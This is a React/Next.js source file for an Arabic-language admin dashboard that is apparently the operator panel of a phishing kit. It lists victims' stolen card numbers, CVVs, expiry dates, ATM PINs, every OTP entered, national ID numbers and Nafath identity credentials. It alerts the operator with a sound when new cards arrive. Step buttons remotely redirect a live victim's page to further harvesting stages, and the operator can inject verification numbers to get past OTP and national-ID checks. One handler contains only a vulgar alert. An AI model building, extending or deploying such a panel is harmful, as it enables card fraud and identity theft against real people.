"use client"
import type React from "react"
import { useState, useEffect, useMemo } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  CreditCard,
  CheckCircle,
  XCircle,
  Clock,
  MapPin,
  User,
  TrendingUp,
  Phone,
  LockIcon,
  Shield,
  ClipboardCheck,
  Flag,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader } from "@/components/ui/card"
import { collection, doc, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import { toast } from "@/hooks/use-toast"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
function useOnlineUsersCount() {
    const [onlineUsersCount, setOnlineUsersCount] = useState(0)
  
    useEffect(() => {
      const onlineUsersRef = ref(database, "status")
      const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
        const data = snapshot.val()
        if (data) {
          const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
          setOnlineUsersCount(onlineCount)
        }
      })
  
      return () => unsubscribe()
    }, [])
  
    return onlineUsersCount
  }
  function UserStatus({ userId }: { userId: string }) {
    const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")
  
    useEffect(() => {
      const userStatusRef = ref(database, `/status/${userId}`)
  
      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        if (data) {
          setStatus(data.state === "online" ? "online" : "offline")
        } else {
          setStatus("unknown")
        }
      })
  
      return () => unsubscribe()
    }, [userId])
  
    return (
      <div className="flex items-center gap-2">
        <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"}`} />
        <Badge
          variant="outline"
          className={`text-xs ${status === "online"
            ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
            : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
            }`}
        >
          {status === "online" ? "متصل" : "غير متصل"}
        </Badge>
      </div>
    )
  }
  // Enhanced Flag Color Selector
function FlagColorSelector({
    notificationId,
    currentColor,
    onColorChange,
  }: {
    notificationId: string
    currentColor: any
    onColorChange: (id: string, color: FlagColor) => void
  }) {
    return (
      <Popover>
        <PopoverTrigger asChild>
          <Button variant="ghost" size="icon" className="h-8 w-8">
            <Flag
              className={`h-4 w-4 ${currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground"
                }`}
            />
          </Button>
        </PopoverTrigger>
        <PopoverContent className="w-auto p-2">
          <div className="flex gap-2">
            {[
              { color: "red", label: "عالي الأولوية" },
              { color: "yellow", label: "متوسط الأولوية" },
              { color: "green", label: "منخفض الأولوية" },
            ].map(({ color, label }) => (
              <TooltipProvider key={color}>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="ghost"
                      size="icon"
                      className={`h-8 w-8 rounded-full bg-${color}-100 dark:bg-${color}-900 hover:bg-${color}-200 dark:hover:bg-${color}-800`}
                      onClick={() => onColorChange(notificationId, color as FlagColor)}
                    >
                      <Flag className={`h-4 w-4 text-${color}-500 fill-${color}-500`} />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>{label}</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
            ))}
            {currentColor && (
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
                      onClick={() => onColorChange(notificationId, null)}
                    >
                      <Flag className="h-4 w-4 text-gray-500" />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>إزالة العلم</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
            )}
          </div>
        </PopoverContent>
      </Popover>
    )
  }
interface NotificationData {
  action: string
  allOtps: string[]
  approval: string
  atmPin: string
  authNumber: string
  cardHolderName: string
  cardNumber: string
  country: string
  createdDate: string
  currentPage: string
  cvv: string
  expiryMonth: string
  expiryYear: string
  id: string
  idNumber: string
  lastSeen: string
  nafazId: string
  name: string
  networkProvider: string
  online: boolean
  operator: string
  otp: string
  otpSubmittedAt: string
  phone: string
  phone2: string
  phoneOtpCode: string
  phoneVerificationStatus: string
  timestamp: string
  flagColor?: FlagColor
  isHidden?: boolean
}

// Types
type FlagColor = "red" | "yellow" | "green" | null

const stepButtons = [
  { name: "بطاقه", label: <CreditCard />, step: "2" },
  { name: "كود", label: <LockIcon />, step: "3" },
  { name: "رقم", label: <Phone />, step: "9999" },
  { name: "مصادقة", label: <ClipboardCheck />, step: "nafaz" },
]

// Enhanced Statistics Card Component
function StatisticsCard({
  title,
  value,
  change,
  changeType,
  icon: Icon,
  color,
  trend,
}: {
  title: string
  value: string | number
  change: string
  changeType: "increase" | "decrease" | "neutral"
  icon: React.ElementType
  color: string
  trend?: number[]
}) {
  return (
    <Card className="relative overflow-hidden bg-gradient-to-br from-background to-muted/20 border-0 shadow-lg hover:shadow-xl transition-all duration-300">
      <CardHeader className="pb-2">
        <div className="flex items-center justify-between">
          <div className={`p-3 rounded-xl ${color}`}>
            <Icon className="h-6 w-6 text-white" />
          </div>
          <div className="text-right">
            <p className="text-sm font-medium text-muted-foreground">{title}</p>
            <p className="text-3xl font-bold">{value}</p>
          </div>
        </div>
      </CardHeader>
      <CardContent className="pt-0">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-1">
            <TrendingUp
              className={`h-4 w-4 ${
                changeType === "increase"
                  ? "text-green-500"
                  : changeType === "decrease"
                    ? "text-red-500"
                    : "text-gray-500"
              }`}
            />
            <span
              className={`text-sm font-medium ${
                changeType === "increase"
                  ? "text-green-500"
                  : changeType === "decrease"
                    ? "text-red-500"
                    : "text-gray-500"
              }`}
            >
              {change}
            </span>
          </div>
          {trend && (
            <div className="flex items-end gap-1 h-8">
              {trend.map((value, index) => (
                <div
                  key={index}
                  className={`w-1 rounded-sm ${color.replace("bg-", "bg-")} opacity-60`}
                  style={{ height: `${(value / Math.max(...trend)) * 100}%` }}
                />
              ))}
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  )
}

// Main Component
export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<NotificationData[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "nafaz" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<NotificationData | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage] = useState(10)
  const [settingsOpen, setSettingsOpen] = useState(false)
  const [exportDialogOpen, setExportDialogOpen] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date")
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc")
  const [showStatstics, setShowStatstics] = useState(true)
  const [authNumber, setAuthNumber] = useState("")
  const [tempUrl, setTempUrl] = useState("")
  const [onlineStatuses, setOnlineStatuses] = useState<{ [key: string]: boolean }>({})

  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  useEffect(() => {
    const unsubscribe = fetchNotifications()
    return () => unsubscribe()
  }, [])

  useEffect(() => {
    const onlineUsersRef = ref(database, "onlineUsers")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val() || {}
      setOnlineStatuses(data)
    })
    return () => unsubscribe()
  }, [])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as NotificationData[]

        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber || notification.phone || notification.name) &&
            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.phone || n.name)),
        )

        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound()
        }

        updateStatistics(notificationsData)
        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
        toast({
          title: "خطأ في جلب البيانات",
          description: "حدث خطأ أثناء جلب الإشعارات",
          variant: "destructive",
        })
      },
    )

    return unsubscribe
  }

  const handleCurrentPageUpdate = async (id: string, currentPage: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { currentPage })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, currentPage } : n)))
      toast({
        title: "تم تحديث الصفحة الحالية",
        description: `تم تحديث الصفحة الحالية إلى: ${currentPage}`,
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating current page:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث الصفحة الحالية.",
        variant: "destructive",
      })
    }
  }

  const updateStatistics = (notificationsData: NotificationData[]) => {
    const totalCount = notificationsData.length
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length
    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleInfoClick = (notification: NotificationData, infoType: "personal" | "card" | "nafaz") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const handleAuthNumberUpdate = async (id: string, authNumber: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, {
        authNumber: authNumber,
        phoneVerificationStatus: "approved",
      })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, authNumber: authNumber } : n)))
      toast({
        title: "تم تحديث رقم التحقق",
        description: `تم تحديث رقم التحقق إلى: ${authNumber}`,
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating auth number:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث رقم التحقق.",
        variant: "destructive",
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        approval: state,
      })
      toast({
        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
        description: state === "approved" ? "تمت الموافقة على الإشعار بنجاح" : "تم رفض الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating notification status:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الإشعار",
        variant: "destructive",
      })
    }
  }

  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    const endIndex = startIndex + itemsPerPage
    return notifications.slice(startIndex, endIndex)
  }, [currentPage, itemsPerPage, notifications])

  const closeDialog = () => setSelectedInfo(null)

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="relative">
            <div className="h-12 w-12 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>
            <div className="absolute inset-0 h-12 w-12 animate-pulse rounded-full bg-primary/10"></div>
          </div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    )
  }
  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
      toast({
        title: "تم مسح الإشعار",
        description: "تم مسح الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعار",
        variant: "destructive",
      })
    }
  }


    function handleFlagColorChange(id: string, color: FlagColor): void {
 alert("على زبي")
    }

  return (
    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
      <div className="p-6">
        <Card className="bg-card/50 backdrop-blur-sm border-0 shadow-xl">
          <CardHeader className="pb-4"></CardHeader>

          <CardContent className="p-0">
            {/* Desktop Table View */}
            <div className="hidden lg:block overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b bg-muted/30">
                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الدولة</th>
                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">المعلومات</th>
                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الوقت</th>
                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الاتصال</th>
                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الكود</th>
                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">تحديث الخطوة</th>
                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الإجراءات</th>
                  </tr>
                </thead>
                <tbody>
                  {paginatedNotifications.map((notification, index) => (
                    <tr key={notification.id}>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                            <MapPin className="h-4 w-4 text-primary" />
                          </div>
                          <span className="font-medium">{notification.country || "غير معروف"}</span>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex flex-wrap gap-2">
                          <Badge
                            variant={notification.name ? "default" : "secondary"}
                            className={`cursor-pointer ${notification.phone2 ? " animate-bounce " : ""} transition-all hover:scale-105 ${
                              notification.name ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
                            }`}
                            onClick={() => handleInfoClick(notification, "personal")}
                          >
                            <User className="h-3 w-3 mr-1" />
                            {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                          </Badge>
                          <Badge
                            variant={notification.cardNumber ? "default" : "secondary"}
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
                            }`}
                            onClick={() => handleInfoClick(notification, "card")}
                          >
                            <CreditCard className="h-3 w-3 mr-1" />
                            {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                          </Badge>
                          <Badge
                            variant={notification.nafazId ? "default" : "secondary"}
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification.nafazId ? "bg-gradient-to-r from-yellow-500 to-yellow-600 text-white" : ""
                            }`}
                            onClick={() => handleInfoClick(notification, "nafaz")}
                          >
                            <User className="h-3 w-3 mr-1" />
                            {notification.nafazId ? "معلومات نفاذ" : "لا يوجد معلومات"}
                          </Badge>
                        </div>
                      </td>

                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2 text-sm text-muted-foreground">
                          <Clock className="h-4 w-4" />
                          {notification.createdDate &&
                            formatDistanceToNow(new Date(notification.createdDate), {
                              addSuffix: true,
                              locale: ar,
                            })}
                        </div>
                      </td>
                      <td className="px-6 py-4 text-center">
                        <UserStatus userId={notification.id} />
                      </td>
                      <td className="px-6 py-4 text-center">
                        {notification.otp && (
                          <Badge variant="outline" className="bg-blue-50 text-blue-700 border-blue-200">
                            {notification.otp}
                          </Badge>
                        )}
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex flex-wrap justify-center gap-1">
                          {stepButtons.map(({ name, label, step }) => (
                            <TooltipProvider key={step}>
                              <Tooltip>
                                <TooltipTrigger asChild>
                                  <Button
                                    size="icon"
                                    variant={notification.currentPage === step.toString() ? "default" : "secondary"}
                                    onClick={() => handleCurrentPageUpdate(notification.id, step)}
                                    className={`text-xs px-2 h-7 ${notification.currentPage === step.toString() ? "bg-blue-500" : ""}`}
                                  >
                                    {label}
                                  </Button>
                                </TooltipTrigger>
                                <TooltipContent>
                                  <p>{name}</p>
                                </TooltipContent>
                              </Tooltip>
                            </TooltipProvider>
                          ))}
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex justify-center gap-1">
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => handleDelete(notification.id)}
                                  className="text-red-500 hover:text-red-600 hover:bg-red-50"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>حذف</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                          <Badge>{notification?.currentPage || "0.0"}</Badge>
                          <FlagColorSelector
                            notificationId={notification.id}
                            currentColor={notification?.flagColor}
                            onColorChange={handleFlagColorChange}
                          />
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Mobile Card View */}
            <div className="lg:hidden space-y-4 p-4">
              {paginatedNotifications.map((notification) => (
                <Card key={notification.id}>
                  <CardHeader className="pb-3">
                    <div className="flex justify-between items-start">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                          <MapPin className="h-5 w-5 text-primary" />
                        </div>
                        <div>
                          <p className="font-semibold">{notification.country || "غير معروف"}</p>
                          <p className="text-sm text-muted-foreground">
                            {notification.createdDate &&
                              formatDistanceToNow(new Date(notification.createdDate), {
                                addSuffix: true,
                                locale: ar,
                              })}
                          </p>
                        </div>
                      </div>
                      <UserStatus userId={notification.id} />
                    </div>
                  </CardHeader>

                  <CardContent className="pt-0">
                    <div className="space-y-4">
                      <div className="flex flex-wrap gap-2">
                        <Badge
                          variant={notification.phone ? "default" : "secondary"}
                          className={`cursor-pointer ${notification.phone2 ? " animate-bounce " : ""} ${
                            notification.phone ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
                          }`}
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                        </Badge>
                        <Badge
                          variant={notification.cardNumber ? "default" : "secondary"}
                          className={`cursor-pointer ${
                            notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
                          }`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          <CreditCard className="h-3 w-3 mr-1" />
                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                        </Badge>
                      </div>

                      <div className="pt-3 border-t">
                        <p className="text-sm font-medium text-muted-foreground mb-2">تحديث الخطوة:</p>
                        <div className="flex flex-wrap gap-2">
                          {stepButtons.map(({ label, step }) => (
                            <Button
                              key={step}
                              size="sm"
                              variant={notification.currentPage === step.toString() ? "default" : "outline"}
                              onClick={() => handleCurrentPageUpdate(notification.id, step)}
                            >
                              {label}
                            </Button>
                          ))}
                        </div>
                      </div>

                      <div className="flex justify-between items-center">
                        <div className="flex items-center gap-2">
                          <span className="text-sm text-muted-foreground">الحالة:</span>
                          {notification.approval === "approved" ? (
                            <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                              <CheckCircle className="h-3 w-3 mr-1" />
                              موافق عليه
                            </Badge>
                          ) : notification.approval === "rejected" ? (
                            <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
                              <XCircle className="h-3 w-3 mr-1" />
                              مرفوض
                            </Badge>
                          ) : (
                            <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
                              <Clock className="h-3 w-3 mr-1" />
                              قيد المراجعة
                            </Badge>
                          )}
                        </div>
                        {notification.otp && (
                          <Badge variant="outline" className="bg-blue-50 text-blue-700">
                            {notification.otp}
                          </Badge>
                        )}
                      </div>

                      <div className="flex gap-2 pt-2 border-t">
                        <Button
                          onClick={() => handleApproval("approved", notification.id)}
                          className="flex-1 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700"
                          size="sm"
                          disabled={notification.approval === "approved"}
                        >
                          <CheckCircle className="h-4 w-4 mr-1" />
                          موافقة
                        </Button>
                        <Button
                          onClick={() => handleApproval("rejected", notification.id)}
                          className="flex-1 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700"
                          size="sm"
                          disabled={notification.approval === "rejected"}
                        >
                          <XCircle className="h-4 w-4 mr-1" />
                          رفض
                        </Button>
                        <Button
                          variant="outline"
                          onClick={() => handleDelete(notification.id)}
                          className="text-red-500 hover:text-red-600 hover:bg-red-50"
                          size="sm"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                        <Badge>{notification?.currentPage}</Badge>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-3 text-xl">
              {selectedInfo === "personal" ? (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center">
                    <User className="h-5 w-5 text-white" />
                  </div>
                  المعلومات الشخصية
                </>
              ) : selectedInfo === "card" ? (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-green-500 to-green-600 flex items-center justify-center">
                    <CreditCard className="h-5 w-5 text-white" />
                  </div>
                  معلومات البطاقة
                </>
              ) : (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-yellow-500 to-yellow-600 flex items-center justify-center">
                    <Shield className="h-5 w-5 text-white" />
                  </div>
                  معلومات نفاذ
                </>
              )}
            </DialogTitle>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                {[
                  { label: "الاسم", value: selectedNotification.name },
                  { label: "اسم حامل البطاقة", value: selectedNotification.cardHolderName },
                  { label: "رقم الهوية", value: selectedNotification.idNumber },
                  { label: "الشبكة", value: selectedNotification.operator || selectedNotification.networkProvider },
                  { label: "رقم الجوال", value: selectedNotification.phone },
                  { label: "الهاتف 2", value: selectedNotification.phone2 },
                  { label: "رمز هاتف", value: selectedNotification.phoneOtpCode },
                ].map(
                  ({ label, value }) =>
                    value && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                      >
                        <span className="font-medium text-muted-foreground">{label}:</span>
                        <span className="font-semibold">{value}</span>
                      </div>
                    ),
                )}
              </div>
            </div>
          )}

          {selectedInfo === "nafaz" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                <div className="flex justify-between items-center py-2 border-b border-border/30">
                  <span className="font-medium text-muted-foreground">معرف نفاذ:</span>
                  <span className="font-semibold">{selectedNotification?.nafazId || "غير متوفر"}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-border/30">
                  <span className="font-medium text-muted-foreground">رقم التحقق:</span>
                  <span className="font-semibold">{selectedNotification?.authNumber || "غير متوفر"}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-border/30 last:border-0">
                  <span className="font-medium text-muted-foreground">حالة التحقق:</span>
                  <span className="font-semibold">{selectedNotification?.phoneVerificationStatus}</span>
                </div>
              </div>
              <div className="flex justify-around gap-2">
                <Input
                  type="tel"
                  value={authNumber}
                  onChange={(e) => setAuthNumber(e.target.value)}
                  placeholder="أدخل رقم التحقق"
                  className="flex-1"
                />
                <Button onClick={() => handleAuthNumberUpdate(selectedNotification!.id!, authNumber)}>تحديث</Button>
              </div>
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                {[
                  { label: "اسم حامل البطاقة", value: selectedNotification.cardHolderName },
                  { label: "رقم البطاقة", value: selectedNotification.cardNumber },
                  {
                    label: "تاريخ الانتهاء",
                    value:
                      selectedNotification.expiryMonth && selectedNotification.expiryYear
                        ? `${selectedNotification.expiryMonth}/${selectedNotification.expiryYear}`
                        : undefined,
                  },
                  { label: "رمز الأمان", value: selectedNotification.cvv },
                  { label: "رقم التعريف الشخصي", value: selectedNotification.atmPin },
                  { label: "رمز التحقق", value: selectedNotification.otp },
                  { label: "الخطوة الحالية", value: selectedNotification.currentPage },
                ].map(
                  ({ label, value }) =>
                    value !== undefined && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                      >
                        <span className="font-medium text-muted-foreground">{label}:</span>
                        <span className="font-semibold" dir="ltr">
                          {String(value)}
                        </span>
                      </div>
                    ),
                )}
                {selectedNotification.allOtps &&
                  Array.isArray(selectedNotification.allOtps) &&
                  selectedNotification.allOtps.length > 0 && (
                    <div className="pt-2 border-t border-border/30">
                      <span className="font-medium text-muted-foreground block mb-2">جميع الرموز:</span>
                      <div className="flex flex-wrap gap-2">
                        {selectedNotification.allOtps.map((otp, index) => (
                          <Badge key={index} variant="outline" className="bg-muted">
                            {otp}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
